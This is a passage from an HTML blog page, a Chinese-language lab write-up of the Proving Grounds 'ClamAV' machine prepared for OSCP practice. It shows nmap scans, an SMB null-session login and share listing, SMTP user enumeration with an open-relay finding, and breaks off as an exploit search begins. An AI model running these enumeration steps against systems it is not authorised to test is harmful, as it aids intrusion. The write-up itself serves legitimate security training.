@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ProvingGrouds ClamAV WriteUp - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="ProvingGrouds ClamAV WriteUp"><meta name="keywords" content='OSCP, PG_Practice'>
+  <meta itemprop="name" content="ProvingGrouds ClamAV WriteUp">
+  <meta itemprop="description" content="ProvingGrouds ClamAV WriteUp">
+  <meta itemprop="datePublished" content="2023-12-17T07:14:01+00:00">
+  <meta itemprop="dateModified" content="2023-12-17T07:14:01+00:00">
+  <meta itemprop="wordCount" content="1407">
+  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="http://localhost:1313/posts/provinggrounds-clamav/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="ProvingGrouds ClamAV WriteUp">
+  <meta property="og:description" content="ProvingGrouds ClamAV WriteUp">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-12-17T07:14:01+00:00">
+    <meta property="article:modified_time" content="2023-12-17T07:14:01+00:00">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="PG_Practice">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ProvingGrouds ClamAV WriteUp">
+  <meta name="twitter:description" content="ProvingGrouds ClamAV WriteUp">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/provinggrounds-clamav/" title="ProvingGrouds ClamAV WriteUp - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/provinggrounds-hub/" title="ProvingGrouds Hub WriteUp" /><link rel="next" type="text/html" href="http://localhost:1313/posts/provinggrounds-planetexpress/" title="ProvingGrounds PlanetExpress Writeup" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/provinggrounds-clamav/index.md" title="ProvingGrouds ClamAV WriteUp - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ProvingGrouds ClamAV WriteUp",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/provinggrounds-clamav\/"
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  1407 ,
+    "url": "http:\/\/localhost:1313\/posts\/provinggrounds-clamav\/","datePublished": "2023-12-17T07:14:01+00:00","dateModified": "2023-12-17T07:14:01+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": "ProvingGrouds ClamAV WriteUp"
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrouds ClamAV WriteUp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2023-12-17 07:14:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-12-17">2023-12-17</time></span>&nbsp;<span title="1407 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1500 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#clamav">ClamAV</a></li>
+    <li><a href="#端口扫描">端口扫描</a></li>
+    <li><a href="#web">Web</a></li>
+    <li><a href="#smb">SMB</a></li>
+    <li><a href="#smtp">SMTP</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="clamav" class="heading-element"><span>ClamAV</span>
+  <a href="#clamav" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>第8台，Linux系统，难度Easy，名称 ClamAV</p>
+<h2 id="端口扫描" class="heading-element"><span>端口扫描</span>
+  <a href="#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.193.42 -T4                           
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-17 14:18 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.193.42
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">994</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
+</span></span><span class="line"><span class="cl">80/tcp  open  http        Apache httpd 1.3.33 <span class="o">((</span>Debian GNU/Linux<span class="o">))</span>
+</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">199/tcp open  smux        Linux SNMP multiplexer
+</span></span><span class="line"><span class="cl">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: localhost.localdomain<span class="p">;</span> OSs: Linux, Unix<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.94 seconds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">全端口扫描，补充端口如下：
+</span></span><span class="line"><span class="cl">60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 <span class="o">(</span>protocol 2.0<span class="o">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞情况：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Apache 1.3.34/1.3.33 <span class="o">(</span>Ubuntu / Debian<span class="o">)</span> - CGI TTY Privilege Escalation</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web" class="heading-element"><span>Web</span>
+  <a href="#web" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>打开80端口，能看到字符串</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="m">01101001</span> <span class="m">01100110</span> <span class="m">01111001</span> <span class="m">01101111</span> <span class="m">01110101</span> <span class="m">01100100</span> <span class="m">01101111</span> <span class="m">01101110</span> <span class="m">01110100</span> <span class="m">01110000</span> <span class="m">01110111</span> <span class="m">01101110</span> <span class="m">01101101</span> <span class="m">01100101</span> <span class="m">01110101</span> <span class="m">01110010</span> <span class="m">01100001</span> <span class="m">01101110</span> <span class="m">00110000</span> <span class="m">00110000</span> <span class="m">01100010</span> </span></span></code></pre></td></tr></table>
+</div>
+</div><p>二进制解码后就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ifyoudontpwnmeuran00b</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="smb" class="heading-element"><span>SMB</span>
+  <a href="#smb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>探测SMB空口令成功</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ crackmapexec smb 192.168.193.42 -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>             
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             <span class="o">[</span>*<span class="o">]</span> Unix <span class="o">(</span>name:<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             <span class="o">[</span>+<span class="o">]</span> <span class="se">\:</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ crackmapexec smb 192.168.193.42 -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             <span class="o">[</span>*<span class="o">]</span> Unix <span class="o">(</span>name:<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             <span class="o">[</span>+<span class="o">]</span> <span class="se">\:</span> 
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             print$                          Printer Drivers
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             IPC$                            IPC Service <span class="o">(</span>0xbabe server <span class="o">(</span>Samba 3.0.14a-Debian<span class="o">)</span> brave pig<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         192.168.193.42  <span class="m">445</span>    NONE             ADMIN$                          IPC Service <span class="o">(</span>0xbabe server <span class="o">(</span>Samba 3.0.14a-Debian<span class="o">)</span> brave pig<span class="o">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="smtp" class="heading-element"><span>SMTP</span>
+  <a href="#smtp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.193.42 -T4 -p <span class="m">25</span> --script<span class="o">=</span>smtp*
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-17 14:40 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.193.42
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">25/tcp open  smtp    Sendmail 8.13.4/8.13.4/Debian-3sarge3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smtp-enum-users: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   root
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   admin
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   administrator
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   webadmin
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   sysadmin
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   netadmin
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   web
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="nb">test</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-open-relay: Server is an open relay <span class="o">(</span>13/16 tests<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smtp-vuln-cve2010-4344: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  The SMTP server is not Exim: NOT VULNERABLE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smtp-commands: localhost.localdomain Hello <span class="o">[</span>192.168.45.174<span class="o">]</span>, pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use <span class="s2">&#34;HELP &lt;topic&gt;&#34;</span>. 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For <span class="nb">local</span> information send email to Postmaster at your site. 2.0.0 End of HELP info
+</span></span><span class="line"><span class="cl">Service Info: Host: localhost.localdomain<span class="p">;</span> OS: Unix
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.83 seconds</span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞搜索</p>
+<p>搜索box的名称，找到历史漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit clamav
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
